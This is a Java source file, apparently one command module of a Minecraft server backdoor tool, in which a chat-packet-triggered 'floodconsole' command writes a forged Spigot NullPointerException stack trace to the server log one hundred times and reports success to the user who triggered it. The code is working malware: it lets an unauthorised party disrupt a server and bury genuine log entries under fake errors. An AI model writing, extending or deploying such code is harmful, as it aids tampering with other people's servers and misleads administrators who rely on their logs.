package dev.ectasy.impl.commands.free;

import com.github.retrooper.packetevents.event.PacketReceiveEvent;
import com.github.retrooper.packetevents.wrapper.play.client.WrapperPlayClientChatMessage;
import dev.ectasy.api.commands.AbstractCommand;
import dev.ectasy.api.commands.CommandInfo;
import dev.ectasy.api.data.Rank;
import dev.ectasy.api.data.User;
import org.bukkit.Bukkit;

@CommandInfo(
        name = "floodconsole",
        description = "Flood the console with fake error logs.",
        rank = Rank.FREE,
        blatant = true

)
public class CommandFloodConsole extends AbstractCommand {
    @Override
    public void execute(User user, PacketReceiveEvent event, WrapperPlayClientChatMessage packet, String[] args) {
        String version = Bukkit.getServer().getClass().getPackage().getName().split("\\.")[3];
        String[] errors = {
                "Could not pass event EntityTargetLivingEntityEvent to Bukkit",
                "org.bukkit.event.EventException",
                "at org.bukkit.plugin.java.JavaPluginLoader$1.execute(JavaPluginLoader.java:306) ~[spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                "        at org.bukkit.plugin.RegisteredListener.callEvent(RegisteredListener.java:62) ~[spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                "        at org.bukkit.plugin.SimplePluginManager.fireEvent(SimplePluginManager.java:502) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                "        at org.bukkit.plugin.SimplePluginManager.callEvent(SimplePluginManager.java:487) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                "        at net.minecraft.server.v1_11_R1.EntityInsentient.setGoalTarget(EntityInsentient.java:143) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                "        at net.minecraft.server.v1_11_R1.PathfinderGoalTarget.d(PathfinderGoalTarget.java:83) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                "        at net.minecraft.server.v1_11_R1.PathfinderGoalSelector.a(SourceFile:113) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                "        at net.minecraft.server.v1_11_R1.EntityInsentient.doTick(EntityInsentient.java:653) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                "        at net.minecraft.server.v1_11_R1.EntityLiving.n(EntityLiving.java:2037) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                "        at net.minecraft.server.v1_11_R1.EntityInsentient.n(EntityInsentient.java:501) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                "        at net.minecraft.server.v1_11_R1.EntityMonster.n(EntityMonster.java:24) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                "        at net.minecraft.server.v1_11_R1.EntityZombie.n(EntityZombie.java:155) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                "        at net.minecraft.server.v1_11_R1.EntityLiving.A_(EntityLiving.java:1893) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                "        at net.minecraft.server.v1_11_R1.EntityInsentient.A_(EntityInsentient.java:244) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                "        at net.minecraft.server.v1_11_R1.EntityMonster.A_(EntityMonster.java:28) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                "        at net.minecraft.server.v1_11_R1.EntityZombieVillager.A_(EntityZombieVillager.java:70) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                "        at net.minecraft.server.v1_11_R1.World.entityJoinedWorld(World.java:1629) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                "        at net.minecraft.server.v1_11_R1.World.h(World.java:1604) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                "        at net.minecraft.server.v1_11_R1.World.tickEntities(World.java:1430) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                "        at net.minecraft.server.v1_11_R1.WorldServer.tickEntities(WorldServer.java:618) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                "        at net.minecraft.server.v1_11_R1.MinecraftServer.D(MinecraftServer.java:814) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                "        at net.minecraft.server.v1_11_R1.DedicatedServer.D(DedicatedServer.java:399) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                "        at net.minecraft.server.v1_11_R1.MinecraftServer.C(MinecraftServer.java:678) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                "        at net.minecraft.server.v1_11_R1.MinecraftServer.run(MinecraftServer.java:576) [spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                "        at java.lang.Thread.run(Unknown Source) [?:1.8.0_77]",
                "Caused by: java.lang.NullPointerException",
                "  at org.bukkit.plugin.RegisteredListener.callEvent(RegisteredListener.java:214) ~[?:?]",
                "        at sun.reflect.GeneratedMethodAccessor7.invoke(Unknown Source) ~[?:?]",
                "        at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) ~[?:1.8.0_77]",
                "        at java.lang.reflect.Method.invoke(Unknown Source) ~[?:1.8.0_77]",
                "        at org.bukkit.plugin.java.JavaPluginLoader$1.execute(JavaPluginLoader.java:302) ~[spigot.jar:git-Spigot-d4f98a3-cb61ac0]",
                "        ... 24 more"
        };
        for(int i = 0; i < 100; i++){
            for(String error : errors){
                Bukkit.getLogger().severe(error.replace("v1_11_R1", version));
            }
        }

        user.sendMessage("Console has been flooded with fake error logs.");
    }
}
